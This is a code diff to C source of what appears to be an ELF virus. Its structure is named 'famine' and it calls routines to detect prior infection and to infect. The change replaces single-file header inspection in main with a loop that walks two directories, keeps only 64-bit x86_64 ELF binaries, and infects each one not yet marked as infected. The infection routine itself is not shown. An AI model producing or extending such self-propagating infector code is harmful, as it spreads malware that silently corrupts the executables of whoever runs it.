@@ -13,6 +13,14 @@ int ft_readelf(t_famine *famine)
         famine->type = 1;
         famine->file_size = famine->file_info.st_size;
         famine->header = (Elf64_Ehdr *)famine->elf;
+        if ((famine->header->e_ident[EI_CLASS] == ELFCLASS64) && (famine->header->e_machine == EM_X86_64))
+            famine->valid = 1;
+        else
+        {
+            famine->valid = 0;
+            close(famine->fd);
+            return (-1);
+        }
     }
     else
     {
@@ -40,30 +48,34 @@ int ft_checkarg(t_famine *famine)
     return (ft_readelf(famine));
 }
 
-int main(int argc, char **argv, char **env)
+int main()
 {
     t_famine    *famine;
-
-    if (argc != 2)
-        return (1);
+    char        path[1024];
+    int         i = 0;
 
     famine = malloc(sizeof(t_famine));
     if (!famine)
         return (1);
-    famine->env = env;
-    famine->file = argv[1];
-    if (ft_checkarg(famine))
+    while (i < 2)
     {
-        free(famine);
-        return (1);
+        famine->dir = opendir(ft_setdir(i));
+        while ((famine->readdir = readdir(famine->dir)) != NULL)
+        {
+            snprintf(path, sizeof(path), "%s/%s", ft_setdir(i), famine->readdir->d_name);
+            if (famine->readdir->d_name[0] == '.')
+                continue;
+            famine->file = path; 
+            if (ft_checkarg(famine))
+                continue;
+            ft_pointer_section_table(famine);
+            ft_pointer_strings_table(famine);
+            if (ft_detect_prev_infection(famine))
+                ft_infect(famine);
+        }
+        closedir(famine->dir);
+        i++;
     }
-
-    ft_pointer_section_table(famine);
-    ft_pointer_strings_table(famine);
-    ft_printheader(famine);
-
-    if (ft_detect_prev_infection(famine))
-        ft_infect(famine);
     free(famine);
     return (0);
 }
